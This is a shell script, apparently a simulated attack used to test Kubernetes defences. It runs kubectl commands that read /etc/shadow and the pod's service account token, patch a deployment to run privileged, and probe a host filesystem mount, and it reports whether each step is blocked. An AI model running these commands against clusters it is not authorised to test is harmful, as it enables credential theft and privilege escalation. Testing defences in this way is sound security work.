#!/bin/sh
set -eu

# Attempts to escalate privileges by modifying security contexts
# This simulates an attacker trying to gain root access

namespace="${1:-frontend}"
pod_name="${2:-}"

echo "[ATTACK] Attempting privilege escalation in namespace: $namespace"

# Try to find a pod if not specified
if [ -z "$pod_name" ]; then
    pod_name=$(kubectl get pods -n "$namespace" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
    if [ -z "$pod_name" ]; then
        echo "[ERROR] No pods found in namespace $namespace"
        exit 1
    fi
fi

echo "[INFO] Target pod: $pod_name"

# Attempt 1: Try to exec into pod and check current user
echo "[ATTACK] Checking current user context..."
kubectl exec -n "$namespace" "$pod_name" -- whoami 2>/dev/null || true

# Attempt 2: Try to access sensitive files
echo "[ATTACK] Attempting to access /etc/shadow..."
kubectl exec -n "$namespace" "$pod_name" -- cat /etc/shadow 2>/dev/null || echo "[BLOCKED] Access denied to /etc/shadow"

# Attempt 3: Try to modify security contexts via API
echo "[ATTACK] Attempting to patch deployment with privileged=true..."
kubectl patch deployment -n "$namespace" "$(kubectl get pod -n "$namespace" "$pod_name" -o jsonpath='{.metadata.ownerReferences[0].name}')" \
    --type='json' \
    -p='[{"op": "replace", "path": "/spec/template/spec/containers/0/securityContext/privileged", "value": true}]' 2>/dev/null || echo "[BLOCKED] Cannot modify security context"

# Attempt 4: Try to mount host filesystem
echo "[ATTACK] Attempting to access host filesystem..."
kubectl exec -n "$namespace" "$pod_name" -- ls -la /host 2>/dev/null || echo "[BLOCKED] Host filesystem not accessible"

# Attempt 5: Try to access service account token
echo "[ATTACK] Attempting to read service account token..."
kubectl exec -n "$namespace" "$pod_name" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 50 || echo "[BLOCKED] Service account token access denied"

echo "[COMPLETE] Privilege escalation attempts finished"

